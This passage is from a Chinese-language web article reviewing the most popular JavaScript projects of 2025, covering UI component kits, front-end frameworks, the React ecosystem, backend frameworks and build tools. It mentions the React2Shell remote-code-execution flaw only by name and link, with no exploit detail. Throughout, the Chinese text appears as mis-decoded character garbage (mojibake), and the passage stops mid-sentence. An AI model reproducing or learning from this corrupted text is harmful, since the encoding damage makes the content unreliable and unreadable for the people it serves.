<p><a href="https://link.juejin.cn?target=https%3A%2F%2Freactbits.dev%2F" target="_blank" title="https://reactbits.dev/" ref="nofollow noopener noreferrer">React Bits</a> æ˜¯ä¸€ç³»åˆ—ç²¾ç¾çš„ React åŠ¨ç”»ç»„ä»¶ï¼ˆèƒŒæ™¯æ•ˆæœã€æ–‡æœ¬åŠ¨ç”»ã€å¡ç‰‡ç­‰ï¼‰ï¼Œéå¸¸é€‚åˆæ„å»ºä»¤äººå°è±¡æ·±åˆ»çš„ç½‘ç«™ã€‚</p>
<p>æœ‰è¶£çš„æ˜¯ï¼Œå®ƒä»¥ shadcn/ui é¡¹ç›®çš„å½¢å¼åˆ†å‘ï¼Œå¯ä»¥é€šè¿‡å‘½ä»¤è¡Œä» shadcn/ui æ³¨å†Œè¡¨è·å–ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ä¼ ç»Ÿçš„å¤åˆ¶ç²˜è´´æ–¹å¼æ·»åŠ åˆ°ä»£ç åº“ä¸­ã€‚</p>
<p>è¯¥æ–‡æ¡£é™„å¸¦ä¸€ä¸ªåå°å·¥ä½œå®¤ï¼Œå¯è®©ä½ è°ƒæ•´å’Œè‡ªå®šä¹‰æ‰€æœ‰ç»„ä»¶çš„è®¾ç½®ï¼ˆé¢œè‰²ã€é€Ÿåº¦ã€ç²’å­æ•°é‡â€¦â€¦ï¼‰ï¼Œå¹¶å°†å…¶å¯¼å‡ºä¸ºä»£ç ç‰‡æ®µï¼Œä½ å¯ä»¥å°†å…¶å¤åˆ¶ç²˜è´´åˆ°ä»£ç åº“ä¸­ã€‚</p>
<h3 data-id="heading-4">2.3. å­£å†›ï¼šshadcn-ui</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fui.shadcn.com%2F" target="_blank" title="https://ui.shadcn.com/" ref="nofollow noopener noreferrer">shadcn-ui</a> æ˜¯ 2023 å¹´å’Œ 2024 å¹´çš„å† å†›ï¼Œ2025 å¹´ä¾ç„¶ä¿æŒäº†å¼ºåŠ²çš„å‘å±•åŠ¿å¤´ã€‚</p>
<p>è¿™æ˜¯ä¸€å¥—è®¾è®¡ç²¾è‰¯ã€æ³¨é‡ç»†èŠ‚ï¼ˆä¾‹å¦‚å¯è®¿é—®æ€§ã€é”®ç›˜äº¤äº’ç­‰ï¼‰ä¸”é£æ ¼ç»Ÿä¸€çš„ React ç»„ä»¶ï¼Œèåˆäº† Radix UIã€TanStack Table ç­‰æ— å¤´ç»„ä»¶çš„ç²¾åâ€¦â€¦</p>
<p>shadcn/ui æœ€ä»¤äººæƒŠå¹çš„ç‰¹ç‚¹æ˜¯ï¼Œå®ƒåœ¨å¼€ç®±å³ç”¨çš„åŠŸèƒ½å’Œå¯å®šåˆ¶æ€§ä¹‹é—´æ‰¾åˆ°äº†æœ€ä½³å¹³è¡¡ç‚¹ã€‚</p>
<h2 data-id="heading-5">3. å‰ç«¯æ¡†æ¶</h2>
<p>å‰ç«¯æ¡†æ¶ Top 15 åˆ†åˆ«æ˜¯ï¼š</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/90422fbb0d724cc19205216d2cec76e2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768377245&amp;x-signature=IKkAba%2BumSs4gSiR3MmwuS0ArIw%3D" alt="" loading="lazy"/></p>
<p>React é‡æ–°å¤ºå›äº† 2024 å¹´è¢« htmx å¤ºèµ°çš„ç‹å† ã€‚</p>
<p>è™½ç„¶æœ‰å…³äº Solid æˆ– Svelte ç­‰æ›¿ä»£æ–¹æ¡ˆæ˜¯å¦æ›´é€‚åˆæ–°é¡¹ç›®çš„äº‰è®ºï¼Œä½†å› ä¸º LLMs åŸºäº React ä»£ç åº“è¿›è¡Œè®­ç»ƒï¼Œä½¿å¾—è¿™äº›æ›¿ä»£æ–¹æ¡ˆå¾ˆéš¾è·å¾—å¸‚åœºä»½é¢ã€‚</p>
<p>React 19 å¼•å…¥äº†é‡å¤§æ”¹è¿›ï¼ŒåŒ…æ‹¬ <strong>Activity API</strong> å’Œç”¨äºç®¡ç†ç”¨æˆ·äº‹ä»¶çš„å¢å¼ºå‹ hooksã€‚</p>
<p>è¯´åˆ° effectsï¼ŒCloudflare å› ä¸ºé”™è¯¯ä½¿ç”¨ useEffect ï¼Œå¯¼è‡´æ— é™è°ƒç”¨å…¶ API ï¼Œæœ€ç»ˆå¯¼è‡´è‡ªèº«é­å— DDoS æ”»å‡»ï¼Œé€ æˆäº†æœåŠ¡ä¸­æ–­ã€‚</p>
<p>React å‘æœåŠ¡å™¨ç«¯è¿ç§»ï¼Œæ¨å‡ºäº† React Server Componentsï¼Œè¿™æ˜¯è¿‘å¹´æ¥æœ€å¤§çš„å˜é©ã€‚ç„¶è€Œï¼Œè¿™ç§å˜é©ä¹Ÿå¸¦æ¥äº†å·¨å¤§çš„åŠŸèƒ½å’Œé£é™©ï¼Œä¾‹å¦‚ <a href="https://link.juejin.cn?target=https%3A%2F%2Freact2shell.com%2F" target="_blank" title="https://react2shell.com/" ref="nofollow noopener noreferrer">React2Shell</a> æ¼æ´ï¼Œè¿™æ˜¯ä¸€ä¸ª React Server Components ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE) æ¼æ´ï¼Œéœ€è¦ç´§æ€¥å‘å¸ƒè¡¥ä¸è¿›è¡Œä¿®å¤ã€‚ï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2025%2F12%2F03%2Fcritical-security-vulnerability-in-react-server-components" target="_blank" title="https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components" ref="nofollow noopener noreferrer">2025 å¹´ 12 æœˆ 3 æ—¥</a>ï¼Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2025%2F12%2F11%2Fdenial-of-service-and-source-code-exposure-in-react-server-components" target="_blank" title="https://react.dev/blog/2025/12/11/denial-of-service-and-source-code-exposure-in-react-server-components" ref="nofollow noopener noreferrer">2025 å¹´ 12 æœˆ 11 æ—¥ï¼‰</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fripplejs.com%2F" target="_blank" title="https://ripplejs.com/" ref="nofollow noopener noreferrer">Ripple</a> ä½åˆ—ç¬¬äºŒï¼Œæ˜¯å‰äº”åä¸­çš„æ–°ç§€ã€‚å®ƒæ˜¯ä¸€ä¸ªå…¨æ–°çš„ UI æ¡†æ¶ï¼Œèåˆäº† Reactã€Solid å’Œ Svelte çš„ä¼˜ç‚¹ã€‚å®ƒæ‹¥æœ‰å“åº”å¼åŸè¯­ã€ç»„ä»¶åŒ–æ¶æ„å’Œæ¨¡æ¿è¯­æ³•ã€‚</p>
<p>ç›®å‰ä»å¤„äºæ—©æœŸå¼€å‘é˜¶æ®µã€‚React æœ‰ Next.jsï¼ŒVue.js æœ‰ Nuxtï¼ŒSvelte æœ‰ SvelteKitï¼ŒSolid æœ‰ SolidStartâ€¦â€¦Ripple æ˜¯å¦ä¹Ÿä¼šæœ‰è‡ªå·±çš„å…ƒæ¡†æ¶æ¥å¤„ç†æœåŠ¡å™¨ç«¯æ¸²æŸ“ï¼Ÿ</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fsvelte.dev%2F" target="_blank" title="https://svelte.dev/" ref="nofollow noopener noreferrer">Svelte</a> è¿ç»­ç¬¬ä¸‰å¹´ä½åˆ—ç¬¬ä¸‰ã€‚Svelte 5 çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fsvelte.dev%2Fdocs%2Fsvelte%2Fwhat-are-runes" target="_blank" title="https://svelte.dev/docs/svelte/what-are-runes" ref="nofollow noopener noreferrer">Runes</a> å“åº”å¼ç³»ç»Ÿï¼ˆ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>a</mi><mi>t</mi><mi>e</mi><mtext>ã€</mtext></mrow><annotation encoding="application/x-tex">stateã€</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mord cjk_fallback">ã€</span></span></span></span></span>derivedã€$effectï¼‰å·²æˆä¸ºçŠ¶æ€ç®¡ç†çš„æ ‡å‡†æ–¹å¼ã€‚</p>
<h2 data-id="heading-6">4. React ç”Ÿæ€ç³»ç»Ÿ</h2>
<p>React ç”Ÿæ€ç³»ç»Ÿ Top 10 åˆ†åˆ«æ˜¯ï¼š</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b58e5280c2f14b13944b16bce0e4d57e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768377245&amp;x-signature=%2BuiZO2m0aA070ZZbawNXNJlZNSY%3D" alt="" loading="lazy"/></p>
<p>2025 å¹´ï¼ŒReact ç”Ÿæ€ç³»ç»Ÿè¿æ¥äº†ä¸€ä¸ªæ˜æ˜¾çš„è½¬æŠ˜ç‚¹ï¼Œå…¶æ ¸å¿ƒåœ¨äºä¸€ä¸ªé•¿æœŸå­˜åœ¨çš„çŸ›ç›¾ï¼šæ—¥ç›Šå¼ºå¤§çš„æœåŠ¡å™¨ç«¯åŠŸèƒ½ä¸ä¿æŒå®¢æˆ·ç«¯å¼€å‘ç®€æ´æ€§å’Œå¯é¢„æµ‹æ€§ä¹‹é—´çš„å†²çªã€‚</p>
<p>åœ¨ Next.js çš„å¼•é¢†ä¸‹ï¼ŒReact å‘æœåŠ¡å™¨ç»„ä»¶ã€æœåŠ¡å™¨å‡½æ•°å’Œæµå¼ä¼ è¾“çš„è½¬å‹ï¼Œå¼€å¯äº†æ€§èƒ½å’Œæ¶æ„æ–¹é¢çš„æ–°å¯èƒ½ã€‚ä¸æ­¤åŒæ—¶ï¼Œè¿™ç§è½¬å˜ä¹Ÿå¼•å…¥äº†ä¸€ç§æ–°çš„æ€ç»´æ¨¡å¼ï¼šç†è§£å®¢æˆ·ç«¯-æœåŠ¡å™¨è¾¹ç•Œã€æ•°æ®ç”Ÿå‘½å‘¨æœŸå’Œæ¸²æŸ“é˜¶æ®µå¯¹äºæ—¥å¸¸å¼€å‘è‡³å…³é‡è¦ã€‚</p>
<p>ç¤¾åŒºå¯¹æ­¤ååº”ä¸ä¸€ã€‚</p>
<p>ä¸€äº›äººæ¬£ç„¶æ¥å—æ–°çš„æœåŠ¡å™¨ä¼˜å…ˆæ–¹å‘ï¼Œè®¤ä¸ºè¿™æ˜¯ React çš„è‡ªç„¶æ¼”è¿›ï¼›è€Œå¦ä¸€äº›äººåˆ™è´¨ç–‘ï¼Œè¿™ç§å¢åŠ çš„å¤æ‚æ€§æ˜¯å¦å€¼å¾—ç”¨äºæ—¥å¸¸ UI å¼€å‘ã€‚å›´ç»•æœåŠ¡å™¨åŠŸèƒ½å’Œè¯·æ±‚è¾¹ç•Œçš„å®‰å…¨äº‹ä»¶è¿›ä¸€æ­¥åŠ å‰§äº†è¿™åœºäº‰è®ºã€‚è¿™äº›äº‹ä»¶æš´éœ²äº†é«˜åº¦æŠ½è±¡çš„å…¨æ ˆæ¨¡å¼å¸¦æ¥çš„é£é™©ï¼ŒåŒæ—¶ä¹Ÿè¡¨æ˜äº†å¦ä¸€ä»¶äº‹ï¼šReact çš„æœåŠ¡å™¨ç«¯æ¨¡å‹å·²ç»è¾¾åˆ°äº†å®é™…åº”ç”¨çš„ç¨‹åº¦ï¼Œå…¶å‡è®¾æ­£åœ¨ç”Ÿäº§ç¯å¢ƒä¸­æ¥å—å‹åŠ›æµ‹è¯•ã€å®¡è®¡å’ŒæŒ‘æˆ˜ã€‚</p>
<p>åœ¨æ­¤èƒŒæ™¯ä¸‹ï¼ŒTanStack Start å› å…¶ä»¥æ›´ä»¥å®¢æˆ·ç«¯ä¸ºä¸­å¿ƒï¼ˆä¸”åŒæ„ï¼‰çš„è§†è§’çœ‹å¾… React çš„æ–°åŠŸèƒ½è€Œå¤‡å—å…³æ³¨ï¼Œå®ƒä¼˜å…ˆè€ƒè™‘æ¸…æ™°æ€§ã€ç±»å‹å®‰å…¨æ€§å’Œæ˜¾å¼æ§åˆ¶ã€‚è¿™è‡ªç„¶è€Œç„¶åœ°å°†è®¨è®ºçš„ç„¦ç‚¹ä»æ¡†æ¶æœ¬èº«è½¬ç§»åˆ°äº†å…³äºå¼€å‘è€…åº”è¯¥æ¥å—å¤šå°‘æŠ½è±¡ä»¥åŠå¤æ‚æ€§çœŸæ­£å½’å±çš„ç†å¿µä¹‹äº‰ï¼Œè€ŒéåŠŸèƒ½ç«èµ›ã€‚</p>
<h2 data-id="heading-7">5. åç«¯ / å…¨æ ˆ</h2>
<p>åç«¯ / å…¨æ ˆ Top 10 åˆ†åˆ«æ˜¯ï¼š</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be8bf6275d4f4099819c15ebdebc0538~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768377245&amp;x-signature=2FvvI6OV6kflCtxxUCFhWgmy3NQ%3D" alt="" loading="lazy"/></p>
<p>ä¸€æ¬¾æ–°æ™‹äº§å“è£è·åç«¯/å…¨æ ˆç±»åˆ«å† å†›ï¼</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmotia.dev%2F" target="_blank" title="https://motia.dev/" ref="nofollow noopener noreferrer">Motia</a> ä»£è¡¨äº†åç«¯å·¥ç¨‹é¢†åŸŸçš„èŒƒå¼è½¬å˜ï¼Œå®ƒå°†ä»¥å¾€éœ€è¦å¤šä¸ªç‹¬ç«‹æ¡†æ¶æ‰èƒ½å®ç°çš„åŠŸèƒ½æ•´åˆåˆ°ä¸€ä¸ªç³»ç»Ÿä¸­ã€‚ç”¨æˆ·æ— éœ€å†ä¸º APIã€åå°ä»»åŠ¡ã€é˜Ÿåˆ—ã€å·¥ä½œæµã€æ•°æ®æµå’Œ AI ä»£ç†ç­‰å„ç§å·¥å…·è€Œçƒ¦æ¼ï¼ŒMotia æä¾›äº†ä¸€ä¸ªæ¶µç›–æ‰€æœ‰åç«¯åŠŸèƒ½çš„ç»Ÿä¸€æ¡†æ¶ã€‚</p>
<p>Motia çš„æ ¸å¿ƒæ˜¯ä½¿ç”¨åä¸ºâ€œæ­¥éª¤â€<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.motia.dev%2Fdocs%2Fconcepts%2Fsteps" target="_blank" title="https://www.motia.dev/docs/concepts/steps" ref="nofollow noopener noreferrer">ï¼ˆStepsï¼‰</a>çš„åŸºæœ¬å•å…ƒï¼Œå®ƒæ˜¯ä¸€ç§å•ä¸€çš„æŠ½è±¡æ¦‚å¿µï¼Œå®šä¹‰äº†ä»£ç çš„è¿è¡Œæ–¹å¼ã€è¿è¡Œæ—¶é—´ã€è¿è¡Œåœ°ç‚¹ä»¥åŠè¿è¡Œå†…å®¹ã€‚æ¯ä¸ªæ­¥éª¤éƒ½åŒ…å«ä¸€ä¸ªé…ç½®ï¼ˆç”¨äºå®šä¹‰è§¦å‘å™¨ã€è·¯å¾„å’Œè®¡åˆ’ä»»åŠ¡ï¼‰å’Œä¸€ä¸ªå¤„ç†ç¨‹åºï¼ˆç”¨äºæ‰§è¡Œä¸šåŠ¡é€»è¾‘ï¼‰ã€‚æ›´æ”¹æ­¥éª¤ç±»å‹ï¼Œç›¸åŒçš„æ¨¡å¼å³å¯åº”ç”¨äºä¸åŒçš„ç”¨ä¾‹ï¼šAPI ç«¯ç‚¹ã€äº‹ä»¶å¤„ç†ç¨‹åºæˆ–å®šæ—¶ä»»åŠ¡ã€‚</p>
<p>æ­¥éª¤å¯ä»¥ç”¨ TypeScript æˆ– Python ç¼–å†™ã€‚å®ƒè¿˜é€šè¿‡ Workbench æä¾›å†…ç½®çš„å¯è§‚å¯Ÿæ€§ï¼ŒWorkbench æ˜¯ä¸€ä¸ªå¯è§†åŒ–æ§åˆ¶é¢æ¿ï¼Œç”¨äºç®¡ç†ã€è°ƒè¯•å’Œè§‚å¯Ÿè¿è¡Œæƒ…å†µï¼Œæ­¤å¤–è¿˜å†…ç½®äº†çŠ¶æ€ç®¡ç†å’Œæµå¼ä¼ è¾“åŠŸèƒ½ã€‚</p>
<p>æ¥ä¸‹æ¥çš„ 4 ä¸ªé¡¹ç›®ä¸ 2024 å¹´ç›¸åŒï¼Œåªæ˜¯ Hono å’Œ Astro çš„ä½ç½®äº’æ¢äº†ã€‚</p>
<p>å»å¹´æ’åç¬¬ä¸€çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fpayloadcms.com%2F" target="_blank" title="https://payloadcms.com/" ref="nofollow noopener noreferrer">Payload æ˜¯ä¸€æ¬¾åŸºäº Next.js çš„æ··åˆå‹æ— å¤´ CMS å’Œç®¡ç†é¢æ¿ã€‚æœ€å¤§çš„æ–°é—»æ˜¯å®ƒ</a><a href="https://link.juejin.cn?target=https%3A%2F%2Fpayloadcms.com%2Fposts%2Fblog%2Fpayload-is-joining-figma" target="_blank" title="https://payloadcms.com/posts/blog/payload-is-joining-figma" ref="nofollow noopener noreferrer">è¢« Figma æ”¶è´­</a>ï¼Œå…¶æœ€ç»ˆç›®æ ‡æ˜¯ç¼©å°è®¾è®¡ä¸ä»£ç ä¹‹é—´çš„å·®è·ã€‚</p>
<p>Next.js 16 å¼•å…¥äº†<a href="https://link.juejin.cn?target=https%3A%2F%2Fnextjs.org%2Fblog%2Fnext-16%23cache-components" target="_blank" title="https://nextjs.org/blog/next-16#cache-components" ref="nofollow noopener noreferrer">ç¼“å­˜ç»„ä»¶</a>ï¼Œä½¿ç¼“å­˜æœºåˆ¶æ›´åŠ æ˜ç¡®å’Œçµæ´»ã€‚å¼€å‘è€…å¯ä»¥åˆ›å»ºåŒ…å«æ¥è‡ªæœåŠ¡å™¨çš„åŠ¨æ€å†…å®¹æµçš„é™æ€é¡µé¢æ¡†æ¶ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fastro.build%2F" target="_blank" title="https://astro.build/" ref="nofollow noopener noreferrer">Astro</a> ä½åˆ—ç¬¬å››ï¼Œå®ƒç»§ç»­é—ªè€€ç€å…‰èŠ’ï¼Œä½œä¸ºä¸€ä¸ªå¤šåŠŸèƒ½çš„æ¡†æ¶ï¼Œå¯ä»¥æ„å»ºå†…å®¹ä¸°å¯Œçš„åº”ç”¨ç¨‹åºï¼ˆä¾‹å¦‚æ‚¨å–œçˆ±çš„ JS Rising Starsï¼ï¼‰ï¼ŒåŒæ—¶æä¾›è‰¯å¥½çš„å¼€å‘è€…ä½“éªŒå¹¶æ³¨é‡æ€§èƒ½ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fhono.dev%2F" target="_blank" title="https://hono.dev/" ref="nofollow noopener noreferrer">Hono</a> ä½åˆ—ç¬¬äº”ï¼Œå‡­å€Ÿå…¶è½»é‡çº§æ ¸å¿ƒï¼ˆå¯åœ¨ Node.js è¿è¡Œæ—¶ã€Cloudflare å·¥ä½œè¿›ç¨‹ç­‰å„ç§ç¯å¢ƒä¸­è¿è¡Œï¼‰ä»¥åŠä¸°å¯Œçš„å¤„ç†å™¨å’Œä¸­é—´ä»¶ç”Ÿæ€ç³»ç»Ÿï¼Œæˆä¸ºç°ä»£ Web æœåŠ¡å™¨çš„æ ‡å‡†ï¼ˆå³ä½¿ <a href="https://link.juejin.cn?target=https%3A%2F%2Fexpressjs.com%2F" target="_blank" title="https://expressjs.com/" ref="nofollow noopener noreferrer">Express ä»ç„¶æµè¡Œï¼ï¼‰ã€‚</a></p>
<p>å…ƒæ¡†æ¶ç±»åˆ«ä¸­æœ€å¤§çš„å˜åŒ–æ˜¯<a href="https://link.juejin.cn?target=https%3A%2F%2Ftanstack.com%2Fstart%2Flatest" target="_blank" title="https://tanstack.com/start/latest" ref="nofollow noopener noreferrer">Tanstack Start</a>çš„å´›èµ·ï¼Œå¦‚æœä½ æƒ³åœ¨ React ä¹‹ä¸Šæ„å»ºå…¨æ ˆåº”ç”¨ç¨‹åºï¼Œå®ƒæ˜¯ Next.js çš„æœ€ä½³æ›¿ä»£æ–¹æ¡ˆä¹‹ä¸€ã€‚</p>
<h2 data-id="heading-8">6. å·¥å…·</h2>
<p>å·¥å…· Top 5 åˆ†åˆ«æ˜¯ï¼š</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/06a12e0f133d4e70acc67461df248a82~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768377245&amp;x-signature=cC8H9AIzxFl4f5kri5a72rYE6Mc%3D" alt="" loading="lazy"/></p>
<p>Bun çš„æŒç»­åŠªåŠ›æœ€ç»ˆè·å¾—äº†å›æŠ¥ï¼Œè¿™æ¬¾ä¸€ä½“åŒ– JavaScript å·¥å…·åŒ…è£ç™»æ¦œé¦–ã€‚åœ¨è¿‡å»çš„ä¸€å¹´ä¸­ï¼Œå®ƒä¸æ–­æå‡æ€§èƒ½ã€å¢å¼ºå¯¹<a href="https://link.juejin.cn?target=https%3A%2F%2Fbun.com%2Fblog%2Fbun-v1.2%23node-js-compatibility" target="_blank" title="https://bun.com/blog/bun-v1.2#node-js-compatibility" ref="nofollow noopener noreferrer">Node.js çš„å…¼å®¹æ€§</a>ï¼Œå¹¶æ¨å‡ºè®¸å¤šå®ç”¨æ–°åŠŸèƒ½ï¼Œä½¿å…¶æˆä¸º<a href="https://link.juejin.cn?target=https%3A%2F%2Fbun.com%2Fblog%2Fbun-v1.3%23full-stack-javascript-runtime" target="_blank" title="https://bun.com/blog/bun-v1.3#full-stack-javascript-runtime" ref="nofollow noopener noreferrer">å…¨æ ˆ JavaScript å¼€å‘çš„ç†æƒ³å¹³å°</a>ã€‚å¹´åº•ï¼ŒBun è¢« Anthropic æ”¶è´­ï¼Œæˆ‘ä»¬éå¸¸æœŸå¾… 2026 å¹´ Bun çš„å‘å±•ã€‚</p>
<p>ä»Šå¹´å¯¹ <a href="https://link.juejin.cn?target=https%3A%2F%2Fvoidzero.dev%2F" target="_blank" title="https://voidzero.dev/" ref="nofollow noopener noreferrer">void(0)</a> æ¥è¯´ä¹Ÿæ„ä¹‰éå‡¡ã€‚è¯¥å…¬å¸<a href="https://link.juejin.cn?target=https%3A%2F%2Fvoidzero.dev%2Fposts%2Fannouncing-voidzero-inc" target="_blank" title="https://voidzero.dev/posts/announcing-voidzero-inc" ref="nofollow noopener noreferrer">åœ¨ 2024 å¹´åº•å®£å¸ƒ</a>ï¼Œå…¶æ­£åœ¨å¼€å‘æ–°ä¸€ä»£å‰ç«¯åŸºç¡€è®¾æ–½å·¥å…·ï¼ˆOxc å’Œ Rolldownï¼‰ï¼Œå¹¶å·²è®©æˆ‘ä»¬å¾—ä»¥ä¸€çª¥æœªæ¥å‘å±•æ–¹å‘ã€‚å…¶æ——èˆ°é¡¹ç›® Vite åœ¨è¿™ä¸€å¹´ä¸­æŒç»­æ”¹è¿›ï¼Œç¨³å®šäº†æ–°çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fmain.vite.dev%2Fguide%2Fapi-environment" target="_blank" title="https://main.vite.dev/guide/api-environment" ref="nofollow noopener noreferrer">Environment API</a>ï¼Œå¹¶å®ç°äº†å¯¹<a href="https://link.juejin.cn?target=https%3A%2F%2Fvite.dev%2Fblog%2Fannouncing-vite8-beta" target="_blank" title="https://vite.dev/blog/announcing-vite8-beta" ref="nofollow noopener noreferrer">åŸºäº Rust çš„å…¨æ–°æ‰“åŒ…å·¥å…· Rolldown çš„</a>æ”¯æŒã€‚è¯¥é¡¹ç›®ç”šè‡³è¿˜æ‹¥æœ‰äº†è‡ªå·±çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DbmWQqAKLgT4" target="_blank" title="https://www.youtube.com/watch?v=bmWQqAKLgT4" ref="nofollow noopener noreferrer">çºªå½•ç‰‡</a>ã€‚Vitest ä¹Ÿå‘å¸ƒäº†å…¶æœ€å—æœŸå¾…çš„åŠŸèƒ½ä¹‹ä¸€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fvoidzero.dev%2Fposts%2Fannouncing-vitest-4" target="_blank" title="https://voidzero.dev/posts/announcing-vitest-4" ref="nofollow noopener noreferrer">æµè§ˆå™¨æ¨¡å¼</a>ã€‚Oxc ç”Ÿæ€ç³»ç»Ÿä¸­æ¶Œç°å‡ºè®¸å¤šä»¤äººå…´å¥‹çš„æ–°é¡¹ç›®ï¼Œå®ƒä»¬å°†æˆä¸ºç°æœ‰å·¥å…·æå…·å¸å¼•åŠ›çš„æ›¿ä»£æ–¹æ¡ˆï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Foxc.rs%2Fblog%2F2025-06-10-oxlint-stable.html" target="_blank" title="https://oxc.rs/blog/2025-06-10-oxlint-stable.html" ref="nofollow noopener noreferrer">Oxlint</a>æœ‰æœ›æˆä¸ºæ–°ä¸€ä»£ ESLintï¼Œè€Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Foxc.rs%2Fblog%2F2025-12-01-oxfmt-alpha.html" target="_blank" title="https://oxc.rs/blog/2025-12-01-oxfmt-alpha.html" ref="nofollow noopener noreferrer">Oxfmt åˆ™</a>å¯èƒ½æˆä¸ºæ–°ä¸€ä»£ Prettierã€‚è¯¥å…¬å¸åœ¨å¹´åº•å®Œæˆäº†<a href="https://link.juejin.cn?target=https%3A%2F%2Fvoidzero.dev%2Fposts%2Fannouncing-series-a" target="_blank" title="https://voidzero.dev/posts/announcing-series-a" ref="nofollow noopener noreferrer">æ–°ä¸€è½® A è½®èèµ„</a>ï¼Œå¹¶å‘å¸ƒäº†å…¶é¦–æ¬¾å•†ä¸šäº§å“<a href="https://link.juejin.cn?target=https%3A%2F%2Fvoidzero.dev%2Fposts%2Fannouncing-vite-plus" target="_blank" title="https://voidzero.dev/posts/announcing-vite-plus" ref="nofollow noopener noreferrer">Vite+</a>ã€‚</p>
<p>å€¼å¾—ä¸€æçš„è¿˜æœ‰<a href="https://link.juejin.cn?target=https%3A%2F%2Frspack.rs%2F" target="_blank" title="https://rspack.rs/" ref="nofollow noopener noreferrer">Rspack</a>ã€‚è¿™æ¬¾æ¥è‡ªå­—èŠ‚è·³åŠ¨çš„åŸºäº Rust çš„æ‰“åŒ…å·¥å…·ï¼Œé€Ÿåº¦æ›´å¿«ï¼Œè€Œä¸”å¯ä»¥å³æ’å³ç”¨ï¼Œæ˜¯ webpack çš„æ›¿ä»£æ–¹æ¡ˆï¼Œå› æ­¤å®ƒ<a href="https://link.juejin.cn?target=https%3A%2F%2Fnpmtrends.com%2F%40rspack%2Fcore" target="_blank" title="https://npmtrends.com/@rspack/core" ref="nofollow noopener noreferrer">ä»Šå¹´è¢«å¹¿æ³›é‡‡ç”¨</a>ä¹Ÿå°±ä¸è¶³ä¸ºå¥‡äº†ã€‚æ›´å¹¿æ³›çš„ Rstack ç”Ÿæ€ç³»ç»Ÿä¹Ÿå€¼å¾—å…³æ³¨ï¼Œå®ƒå‚¬ç”Ÿäº†<a href="https://link.juejin.cn?target=https%3A%2F%2Frstest.rs%2F" target="_blank" title="https://rstest.rs/" ref="nofollow noopener noreferrer">Rstest</a>å’Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Frslint.org%2F" target="_blank" title="https://rslint.org/" ref="nofollow noopener noreferrer">Rslint</a>ç­‰æ–°å·¥å…·ã€‚</p>
<p>Next.js æœ€è¿‘å°†é»˜è®¤æ‰“åŒ…å·¥å…·<a href="https://link.juejin.cn?target=https%3A%2F%2Fnextjs.org%2Fblog%2Fnext-16%23turbopack-stable" target="_blank" title="https://nextjs.org/blog/next-16#turbopack-stable" ref="nofollow noopener noreferrer">åˆ‡æ¢ä¸º Turbopack</a> ï¼Œç›¸æ¯”ä¹‹å‰çš„æ‰“åŒ…å·¥å…· webpackï¼Œé€Ÿåº¦æœ‰äº†æ˜¾è‘—æå‡ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¹Ÿå¯ä»¥<a href="https://link.juejin.cn?target=https%3A%2F%2Frspack.rs%2Fblog%2Frspack-next-partner" target="_blank" title="https://rspack.rs/blog/rspack-next-partner" ref="nofollow noopener noreferrer">ä½¿ç”¨ Rspack æ„å»º Next.js åº”ç”¨</a>ã€‚</p>
<p>å°½ç®¡å°šæœªå®Œå…¨æˆç†Ÿï¼Œä½†å¾®è½¯ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdevblogs.microsoft.com%2Ftypescript%2Ftypescript-native-port%2Fhttps%3A%2F%2Fdevblogs.microsoft.com%2Ftypescript%2Ftypescript-native-port%2F" target="_blank" title="https://devblogs.microsoft.com/typescript/typescript-native-port/https://devblogs.microsoft.com/typescript/typescript-native-port/" ref="nofollow noopener noreferrer">Go è¯­è¨€é‡å†™ TypeScript</a>æ— 